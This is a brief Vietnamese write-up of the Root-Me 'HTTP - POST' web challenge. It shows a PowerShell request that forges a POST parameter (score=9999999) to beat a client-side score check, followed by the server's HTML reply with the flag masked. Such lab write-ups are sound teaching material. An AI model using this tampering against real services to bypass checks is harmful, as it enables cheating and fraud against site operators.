# HTTP - POST

## Solution

- Để giải, cần gửi POST request với các tham số:
    - score lớn hơn 999999
    - generate với giá trị "Give a try!"

- Tập lệnh để lấy cờ:

```
# Params
$p = @{score='9999999';generate='Give a try!'}
(Invoke-WebRequest -Uri "http://challenge01.root-me.org/web-serveur/ch56/" -Method POST -Body $p).RawContent
```

- Và có flag!

```
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
Date: Mon, 31 Dec 2018 02:39:20 GMT
Server: nginx

<!DOCTYPE html>
<html>
   <head>
       <title>HTTP Basics</title>
   </head>

  <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_head
er'></iframe>
       <h1>RandGame</h1>
       <h2>Human vs. Machine</h2>
       <hr>
       <p>Here is my new game. It's not totally finished but I'm sure nobody can beat me! ;)</p>
       <ul>
           <li>Rules: click on the button to hope to generate a great score</li>
           <li>Score to beat: <strong>999999</strong></li>
       </ul>

       <p>Wow, 9999999! How did you do that? :o</p><p>Flag to validate the challenge: <strong>***********</strong></p>
       <form action="" method="post" onsubmit="document.getElementsByName('score')[0].value = Math.floor(Math.random() * 1000001)">
           <input type="hidden" name="score" value="-1" />
           <input type="submit" name="generate" value="Give a try!">
       </form>
   </body>
</html>
```
